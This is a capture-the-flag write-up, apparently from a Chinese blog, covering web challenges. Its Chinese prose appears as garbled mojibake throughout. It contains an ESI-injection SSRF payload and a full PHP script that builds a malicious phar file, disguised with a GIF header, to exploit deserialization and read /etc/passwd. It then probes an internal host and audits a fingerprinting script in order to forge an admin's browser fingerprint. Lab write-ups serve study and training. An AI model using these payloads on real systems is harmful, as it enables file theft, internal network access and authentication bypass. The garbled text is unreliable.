snipet.html\n\u0026lt;b\u0026gt;Snipet\u0026lt;/b\u0026gt; With Node ESI script, you can pre-process ESI tags.\n çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬çš„æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°ï¼Œå°±æ˜¯ä»¥ esi çš„æ–¹å¼å»è®¿é—® admin é¡µé¢å°±å¯ä»¥äº†ï¼Œç›¸å½“äºå½¢æˆäº†ä¸€ä¸ª SSRF ã€‚\npayload: title=1\u0026amp;description=\u0026lt;esi%3Ainclude+src%3D\u0026quot;http%3A%2F%2Fwebsite.com%2Fadmin\u0026quot;\u0026gt;\u0026lt;%2Fesi%3Ainclude\u0026gt;  \nmime checkr  â€‹\tupload and check the mime type\nHint1: Do you think containers could speak like humans?\n  \né¢˜ç›®è®¾ç½®ä¸ºæœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œåªå…è®¸ä¸Šä¼  .jpeg åç¼€çš„æ–‡ä»¶ï¼Œå°è¯•äº†ä¸€ä¸‹å…¶ä»–æˆªæ–­ï¼Œå‡ä¸èƒ½ä¸Šä¼ å…¶ä»–æ–‡ä»¶\n \nè¿˜æœ‰ä¸€ä¸ªè·å– MIME æ ¼å¼çš„åŠŸèƒ½ï¼Œéœ€è¦ä¼ å…¥è·¯å¾„ï¼Œè¿”å› MIME æ ¼å¼\n \nè¿˜æœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶getmime.bak\n\u0026lt;?php //error_reporting(-1); //ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;On\u0026#39;);  class CurlClass{ public function httpGet($url) { $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); // curl_setopt($ch,CURLOPT_HEADER, false);  $output=curl_exec($ch); curl_close($ch); return $output; } } class MainClass { public function __destruct() { $this-\u0026gt;why =new CurlClass; echo $this-\u0026gt;url; echo $this-\u0026gt;why-\u0026gt;httpGet($this-\u0026gt;url); } } // Check if image file is a actual image or fake image if(isset($_POST[\u0026#34;submit\u0026#34;])) { $check = getimagesize($_POST[\u0026#39;name\u0026#39;]); if($check !== false) { echo \u0026#34;File is an image - \u0026#34; . $check[\u0026#34;mime\u0026#34;] . \u0026#34;.\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;File is not an image.\u0026#34;; $uploadOk = 0; } } ?\u0026gt;çœ‹åˆ°å¤‡ä»½æ–‡ä»¶ä¸­æœ‰_destructä¸curlï¼Œæ€è·¯ä¹Ÿå°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œå¤§è‡´éœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª phar æ–‡ä»¶ï¼Œç„¶åç”¨phar://xx/xxå»è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚\nè¿™é‡Œæˆ‘å…ˆæµ‹è¯•file:///etc/passwdï¼Œç”¨ä»¥ä¸‹ä»£ç ç”Ÿæˆ phar æ–‡ä»¶\n\u0026lt;?php class CurlClass { public function httpGet($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // curl_setopt($ch,CURLOPT_HEADER, false);  $output = curl_exec($ch); curl_close($ch); return $output; } } class MainClass { public function __destruct() { $this-\u0026gt;why = new CurlClass; echo $this-\u0026gt;url; echo $this-\u0026gt;why-\u0026gt;httpGet($this-\u0026gt;url); } } $phar = new Phar(\u0026#34;zedd.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34; . \u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub $o = new MainClass(); $o-\u0026gt;url = \u0026#34;file:///etc/passwd\u0026#34;; $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt;ä¿®æ”¹åç¼€åä¸º .jpeg ï¼Œé€šè¿‡è®¿é—®phar://uploads/f68caba0b9.jpeg/test.txtï¼ŒæˆåŠŸè·å¾—äº†file:///etc/passwdçš„å†…å®¹ã€‚\n \n \nä½†æ˜¯æˆ‘ä»¬å¦‚ä½•æ‰¾ flag å‘¢ï¼Œè¿™é‡Œå…¶å®æ˜¯æ¯”è¾ƒå‘çš„ä¸€ä¸ªç‚¹ï¼Œå…¶å®åŸºæœ¬æ¼æ´åˆ©ç”¨ç‚¹å·²ç»æ‰¾åˆ°äº†ï¼Œæ¥ä¸‹æ¥å…¶å®æ„Ÿè§‰æ˜¯æœ‰äº›å¤šä½™çš„å‡ºé¢˜è®¾ç½®ï¼Œé€šè¿‡è¯•æ¢ä¸€äº›å¸¸ç”¨çš„ flag ç›®å½•è·¯å¾„ï¼Œéƒ½æ²¡æœ‰æ‰¾åˆ° flag ï¼Œè€Œååœ¨/etc/hostså‘ç°äº†åŒä¸€ä¸ªç½‘æ®µçš„å¦ä¸€å°ä¸»æœºã€‚\n \nå¦‚å›¾ä¸­çš„192.168.32.2\t7eaef799a0b8ï¼ŒçŒœæƒ³æ˜¯ä¸æ˜¯åœ¨ 192.168.32.0/24 è¿™ä¸ªæ®µä¸Šï¼Œæˆ–è€…æ¯”è¾ƒé å‰çš„æœºå™¨ä¸Šï¼Œå½“å°è¯•åˆ° 192.168.32.3 æ—¶ï¼Œå‘ç°æœ‰ä¸å¯»å¸¸çš„è¿”å›ã€‚\n \nçœ‹ç€æœ‰ç‚¹åƒç”¨ python åŠ å¯†å‡ºæ¥çš„ä¸œè¥¿ï¼Œæœäº†ä¸€ä¸‹å‘ç°æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªå«ebcdicçš„ python åº“ï¼Œç”¨äº†cp1047ç¼–ç ã€‚\nè§£ç è„šæœ¬ï¼š\nimport ebcdic blob=b\u0026#39;\\xc8\\x85\\x93\\x93\\x96@a\\x86\\x85\\xa3\\x83\\x88\\xa1l\\xad\\xbd_|]M@@\\x94\\x85\u0026#39; print(blob.decode(\u0026#34;cp1047\u0026#34;)) å¾—åˆ°Hello /fetch~%[]^@)( me\n \næ„Ÿè§‰æ˜¯ä¸ª url ä¹‹ç±»çš„ï¼Œå†æ„é€  phar åŒ…ï¼Œè®¿é—® http://192.168.32.3/fetch~%25%5B%5D%5E%40)(ï¼Œå¾—åˆ°\n \nçœ‹èµ·æ¥æ˜¯åŒæ ·çš„åŠ å¯†ï¼Œç›´æ¥è§£å¯†å°±å¯ä»¥äº†ã€‚\nimport ebcdic blob=b\u0026#39;\\xc6\\x93\\x81\\x87\\xc0\\xd7\\xc8\\xd7m\\xe2\\xa3\\x99\\x85\\x81\\x94\\xa2m\\x81\\x99\\x85m\\xa3\\xf0\\xf0m\\xd4\\x81\\x89\\x95\\xe2\\xa3\\x99\\x85\\x81\\x94\\xf0\\xd0\u0026#39; print(blob.decode(\u0026#34;cp1047\u0026#34;)) æœ€åå¾—åˆ° flag\n \ncredz  â€‹\tAlice is a admin of abc company in india. He knows about hackers and makes a system that can login only from his system and only his browser which is chrome.\n Hint: ummm maybe that image has something to do with it. Hint2: Admin is uses fresh chrome Hint3: admin has different CanvasFingerprint Hint4: Windows 10 64 bit   é¢˜ç›®è®¾ç½®ä¸ºä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œå¹¶ä¸”æœ‰ä¸€è¡Œæ³¨é‡Š\n\u0026lt;!-- remember me all the time, credz is not what you need luke --\u0026gt;  \nå°è¯•äº†ä¸€ä¸‹ sql æ³¨å…¥ï¼Œå¹¶æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œåœ¨å°è¯•å¼±å¯†ç çš„æ—¶å€™ä½¿ç”¨admin/adminç™»å½•æˆåŠŸï¼Œä½†æ˜¯é¡µé¢æç¤º\n \nå¾ˆç›´æ¥ï¼Œè®©æˆ‘ä»¬ä¼ªé€  admin çš„ cookie ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å¦å¯»çªç ´å£äº†ï¼Œåœ¨ä¸»é¡µé¢å‘ç°ä¸€ä¸ªè²Œä¼¼ç”¨æ¥è®¾ç½® cookie çš„ js æ–‡ä»¶ï¼š\nFps.js\n(function(name, context, definition) { if (typeof module !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; module.exports) { module.exports = definition() } else if (typeof define === \u0026#39;function\u0026#39; \u0026amp;\u0026amp; define.amd) { define(definition) } else { context[name] = definition() } })(\u0026#39;fpbrowser_v1\u0026#39;, this, function() { \u0026#39;use strict\u0026#39;; var Fingerprint = function(options) { var nativeForEach, nativeMap; nativeForEach = Array.prototype.forEach; nativeMap = Array.prototype.map; this.each = function(obj, iterator, context) { if (obj === null) { return } if (nativeForEach \u0026amp;\u0026amp; obj.forEach === nativeForEach) { obj.forEach(iterator, context) } else if (obj.length === +obj.length) { for (var i = 0, l = obj.length; i \u0026lt; l; i++) { if (iterator.call(context, obj[i], i, obj) === {}) return } } else { for (var key in obj) { if (obj.hasOwnProperty(key)) { if (iterator.call(context, obj[key], key, obj) === {}) return } } } }; this.map = function(obj, iterator, context) { var results = []; if (obj == null) return results; if (nativeMap \u0026amp;\u0026amp; obj.map === nativeMap) return obj.map(iterator, context); this.each(obj, function(value, index, list) { results[results.length] = iterator.call(context, value, index, list) }); return results }; if (typeof options == \u0026#39;object\u0026#39;) { this.hasher = options.hasher; this.screen_resolution = options.screen_resolution; this.screen_orientation = options.screen_orientation; this.canvas = options.canvas; this.ie_activex = options.ie_activex } else if (typeof options == \u0026#39;function\u0026#39;) { this.hasher = options } }; Fingerprint.prototype = { get: function() { var keys = []; keys.push(navigator.userAgent); keys.push(navigator.language); keys.push(screen.colorDepth); if (this.screen_resolution) { var resolution = this.getScreenResolution(); if (typeof resolution !== \u0026#39;undefined\u0026#39;) { keys.push(resolution.join(\u0026#39;x\u0026#39;)) } } keys.push(new Date().getTimezoneOffset()); keys.push(this.hasSessionStorage()); keys.push(this.hasLocalStorage()); keys.push(!!window.indexedDB); if (document.body) { keys.push(typeof(document.body.addBehavior)) } else { keys.push(typeof undefined) } keys.push(typeof(window.openDatabase)); keys.push(navigator.cpuClass); keys.push(navigator.platform); keys.push(navigator.doNotTrack); keys.push(this.getPluginsString()); if (this.canvas \u0026amp;\u0026amp; this.isCanvasSupported()) { keys.push(this.getCanvasFingerprint()) } if (this.hasher) { return this.hasher(keys.join(\u0026#39;###\u0026#39;), 31) } else { return this.fingerprint_js_browser(keys.join(\u0026#39;###\u0026#39;), 31) } }, fingerprint_js_browser: function(key, seed) { var remainder, bytes, h1, h1b, c1, c2, k1, i; remainder = key.length \u0026amp; 3; bytes = key.length - remainder; h1 = seed; c1 = 0xcc9e2d51; c2 = 0x1b873593; i = 0; while (i \u0026lt; bytes) { k1 = ((key.charCodeAt(i) \u0026amp; 0xff)) | ((key.charCodeAt(++i) \u0026amp; 0xff) \u0026lt;\u0026lt; 8) | ((key.charCodeAt(++i) \u0026amp; 0xff) \u0026lt;\u0026lt; 16) | ((key.charCodeAt(++i) \u0026amp; 0xff) \u0026lt;\u0026lt; 24); ++i; k1 = ((((k1 \u0026amp; 0xffff) * c1) + ((((k1 \u0026gt;\u0026gt;\u0026gt; 16) * c1) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16))) \u0026amp; 0xffffffff; k1 = (k1 \u0026lt;\u0026lt; 15) | (k1 \u0026gt;\u0026gt;\u0026gt; 17); k1 = ((((k1 \u0026amp; 0xffff) * c2) + ((((k1 \u0026gt;\u0026gt;\u0026gt; 16) * c2) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16))) \u0026amp; 0xffffffff; h1 ^= k1; h1 = (h1 \u0026lt;\u0026lt; 13) | (h1 \u0026gt;\u0026gt;\u0026gt; 19); h1b = ((((h1 \u0026amp; 0xffff) * 5) + ((((h1 \u0026gt;\u0026gt;\u0026gt; 16) * 5) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16))) \u0026amp; 0xffffffff; h1 = (((h1b \u0026amp; 0xffff) + 0x6b64) + ((((h1b \u0026gt;\u0026gt;\u0026gt; 16) + 0xe654) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16)) } k1 = 0; switch (remainder) { case 3: k1 ^= (key.charCodeAt(i + 2) \u0026amp; 0xff) \u0026lt;\u0026lt; 16; case 2: k1 ^= (key.charCodeAt(i + 1) \u0026amp; 0xff) \u0026lt;\u0026lt; 8; case 1: k1 ^= (key.charCodeAt(i) \u0026amp; 0xff); k1 = (((k1 \u0026amp; 0xffff) * c1) + ((((k1 \u0026gt;\u0026gt;\u0026gt; 16) * c1) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16)) \u0026amp; 0xffffffff; k1 = (k1 \u0026lt;\u0026lt; 15) | (k1 \u0026gt;\u0026gt;\u0026gt; 17); k1 = (((k1 \u0026amp; 0xffff) * c2) + ((((k1 \u0026gt;\u0026gt;\u0026gt; 16) * c2) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16)) \u0026amp; 0xffffffff; h1 ^= k1 } h1 ^= key.length; h1 ^= h1 \u0026gt;\u0026gt;\u0026gt; 16; h1 = (((h1 \u0026amp; 0xffff) * 0x85ebca6b) + ((((h1 \u0026gt;\u0026gt;\u0026gt; 16) * 0x85ebca6b) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16)) \u0026amp; 0xffffffff; h1 ^= h1 \u0026gt;\u0026gt;\u0026gt; 13; h1 = ((((h1 \u0026amp; 0xffff) * 0xc2b2ae35) + ((((h1 \u0026gt;\u0026gt;\u0026gt; 16) * 0xc2b2ae35) \u0026amp; 0xffff) \u0026lt;\u0026lt; 16))) \u0026amp; 0xffffffff; h1 ^= h1 \u0026gt;\u0026gt;\u0026gt; 16; return h1 \u0026gt;\u0026gt;\u0026gt; 0 }, hasLocalStorage: function() { try { return !!window.localStorage } catch (e) { return true } }, hasSessionStorage: function() { try { return !!window.sessionStorage } catch (e) { return true } }, isCanvasSupported: function() { var elem = document.createElement(\u0026#39;canvas\u0026#39;); return !!(elem.getContext \u0026amp;\u0026amp; elem.getContext(\u0026#39;2d\u0026#39;)) }, isIE: function() { if (navigator.appName === \u0026#39;Microsoft Internet Explorer\u0026#39;) { return true } else if (navigator.appName === \u0026#39;Netscape\u0026#39; \u0026amp;\u0026amp; /Trident/.test(navigator.userAgent)) { return true } return false }, getPluginsString: function() { if (this.isIE() \u0026amp;\u0026amp; this.ie_activex) { return this.getIEPluginsString() } else { return this.getRegularPluginsString() } }, getRegularPluginsString: function() { return this.map(navigator.plugins, function(p) { var mimeTypes = this.map(p, function(mt) { return [mt.type, mt.suffixes].join(\u0026#39;~\u0026#39;) }).join(\u0026#39;,\u0026#39;); return [p.name, p.description, mimeTypes].join(\u0026#39;::\u0026#39;) }, this).join(\u0026#39;;\u0026#39;) }, getIEPluginsString: function() { if (window.ActiveXObject) { var names = [\u0026#39;ShockwaveFlash.ShockwaveFlash\u0026#39;, \u0026#39;AcroPDF.PDF\u0026#39;, \u0026#39;PDF.PdfCtrl\u0026#39;, \u0026#39;QuickTime.QuickTime\u0026#39;, \u0026#39;rmocx.RealPlayer G2 Control\u0026#39;, \u0026#39;rmocx.RealPlayer G2 Control.1\u0026#39;, \u0026#39;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)\u0026#39;, \u0026#39;RealVideo.RealVideo(tm) ActiveX Control (32-bit)\u0026#39;, \u0026#39;RealPlayer\u0026#39;, \u0026#39;SWCtl.SWCtl\u0026#39;, \u0026#39;WMPlayer.OCX\u0026#39;, \u0026#39;AgControl.AgControl\u0026#39;, \u0026#39;Skype.Detection\u0026#39;]; return this.map(names, function(name) { try { new ActiveXObject(name); return name } catch (e) { return null } }).join(\u0026#39;;\u0026#39;) } else { return \u0026#34;\u0026#34; } }, getScreenResolution: function() { var resolution; if (this.screen_orientation) { resolution = (screen.height \u0026gt; screen.width) ? [screen.height, screen.width] : [screen.width, screen.height] } else { resolution = [screen.height, screen.width] } return resolution }, getCanvasFingerprint: function() { var canvas = document.createElement(\u0026#39;canvas\u0026#39;); var ctx = canvas.getContext(\u0026#39;2d\u0026#39;); var txt = \u0026#39;I am not admin\u0026#39;; ctx.textBaseline = \u0026#34;top\u0026#34;; ctx.font = \u0026#34;12.5px \u0026#39;Arial\u0026#39;\u0026#34;; ctx.textBaseline = \u0026#34;numeric\u0026#34;; ctx.fillStyle = \u0026#34;#f60\u0026#34;; ctx.fillRect(101, 5, 48, 30); ctx.fillStyle = \u0026#34;#069\u0026#34;; ctx.fillText(txt, 2, 15); ctx.fillStyle = \u0026#34;rgba(111, 177, 0.1, 0.7)\u0026#34;; ctx.fillText(txt, 4, 17); return canvas.toDataURL() } }; return Fingerprint }); function bjs_1(e) { var r = new fpbrowser_v1, t = new fpbrowser_v1({ canvas: !0 }), n = r.get(), o = t.get(), i = n + \u0026#34;\u0026#34; + o, a = getbrowser(), d = new XMLHttpRequest, s = \u0026#34;trackuser.php\u0026#34;, w = \u0026#34;m=\u0026#34; + i; w += \u0026#34;\u0026amp;token=\u0026#34; + e, w += \u0026#34;\u0026amp;b=\u0026#34; + a, d.open(\u0026#34;POST\u0026#34;, s, !0), d.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;), d.onreadystatechange = function() { if (4 == d.readyState \u0026amp;\u0026amp; 200 == d.status) { d.responseText; \u0026#34;index.php\u0026#34; == e \u0026amp;\u0026amp; (document.getElementById(\u0026#34;loaderDiv\u0026#34;).innerHTML = \u0026#34;\u0026#34;) } }, d.send(w) } function getbrowser() { var e = !!window.opr \u0026amp;\u0026amp; !!opr.addons || !!window.opera || navigator.userAgent.indexOf(\u0026#34; OPR/\u0026#34;) \u0026gt;= 0; if (e) return \u0026#34;Opera\u0026#34;; var r = \u0026#34;undefined\u0026#34; != typeof InstallTrigger; if (r) return \u0026#34;FireFox\u0026#34;; var t = Object.prototype.toString.call(window.HTMLElement).indexOf(\u0026#34;Constructor\u0026#34;) \u0026gt; 0; if (t) return \u0026#34;Safari\u0026#34;; var n = !1 || !!document.documentMode; if (n) return \u0026#34;IE\u0026#34;; var o = !n \u0026amp;\u0026amp; !!window.StyleMedia; if (o) return \u0026#34;Edge\u0026#34;; var i = !!window.chrome \u0026amp;\u0026amp; !!window.chrome.webstore; return i ? \u0026#34;Chrome\u0026#34; : \u0026#34;other Browser\u0026#34; } å¤§è‡´è¿›è¡Œäº†ä¸€æ³¢å®¡è®¡ï¼Œä»index.htmlä¸­å«æœ‰çš„\u0026lt;script\u0026gt; var i='index.html'; bjs_1(i); \u0026lt;/script\u0026gt;å¼€å§‹ï¼Œå‘ç°bjs_l()å‡½æ•°ï¼Œå¹¶ä¸”å¯ä»¥æŠ“åˆ°è¯·æ±‚trackuser.phpçš„åŒ…\nPOST /trackuser.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost/ Content-type: application/x-www-form-urlencoded Content-Length: 49 Connection: close Cookie: continueCode=PJgGlaHKhetvcbIlToCVsZFLinSyHZuQcgCJfZSbuphvCV9slmH6ET5v08yK; cookieconsent_status=dismiss; PHPSESSID=877d4hrk97pg1qbnpb37sejqh7 Cache-Control: max-age=0 m=36743815193629702779\u0026amp;token=index.html\u0026amp;b=FireFox è·Ÿè¿›bjs_l()å‡½æ•°ï¼Œå‘ç°åˆå§‹åŒ–äº†ä¸¤ä¸ªfpbrowser_v1ç±»ï¼Œå¹¶ä¸”è°ƒç”¨äº†get()å‡½æ•°è¿”å›å€¼ä½œä¸º ajax è¯·æ±‚ä¸­ m çš„ value å€¼ï¼Œå…³é”®å°±åœ¨Fingerprint.prototypeè¿™é‡Œçš„getå‡½æ•°ï¼Œè¿™é‡Œç”¨keysæ•°ç»„å­˜å‚¨äº†ä¸€ç³»åˆ—çš„å‚æ•°ï¼Œä½†æ˜¯å…¶å®ä¸»è¦çš„åªæ˜¯ä»¥ä¸‹å‡ ä¸ªï¼Œå› ä¸ºå…¶ä»–å‚æ•°æˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥ç”¨ windows 10 è£…ä¸€ä¸ªæœ€æ–°çš„ chrome æ¥æ¨¡æ‹Ÿç¯å¢ƒï¼Œå°±ä¸éœ€è¦å®Œå…¨ä¿®æ”¹å‚æ•°äº†\n navigator.language â€” é¢˜ç›®è®¾ç½®å·²ç»å‘Šè¯‰æˆ‘ä»¬ \u0026ldquo;Alice is a admin of abc company in india\u0026rdquo; navigator.userAgent â€” é¢˜ç›® hint ç»™å‡º windows 10 chrome getTimezoneOffset() â€” India çš„æ—¶åŒº getCanvasFingerprint  å¤§è‡´å°±æ˜¯ä»¥ä¸Šå› ç´ ï¼Œæˆ‘ä»¬å¯ä»¥ä» hint ä¸­æ‰¾åˆ°å¤§éƒ¨åˆ†çš„å‚æ•°ï¼Œè®¾ç½®navigator.languageå¯ä»¥ç”¨ india çš„ language è§£å†³ï¼ŒgetTimezoneOffsetæˆ‘ä»¬å¯ä»¥ç®—å¾—åˆ°æ˜¯-300ï¼Œå”¯ç‹¬getCanvasFingerprintæˆ‘ä»¬ä¸å¤ªæ¸…æ¥šï¼Œç»è¿‡ä»”ç»†æŸ¥é˜…èµ„æ–™çŸ¥é“è¿™ä¸ªå®ç°çš„å°±æ˜¯Canvas Fingerprintingï¼Œè€Œé¢˜ç›®ä¸­é‚£ä¸ªæ³¨é‡Šä»¥åŠ hint ä¹Ÿç»™å‡ºäº†ï¼Œåº”è¯¥å°±æ˜¯ç”¨ index.htmlä¸­çš„é‚£ä¸ªcanvaså›¾ç‰‡\n\u0026lt;img src=\u0026#34;data:image/png;base64,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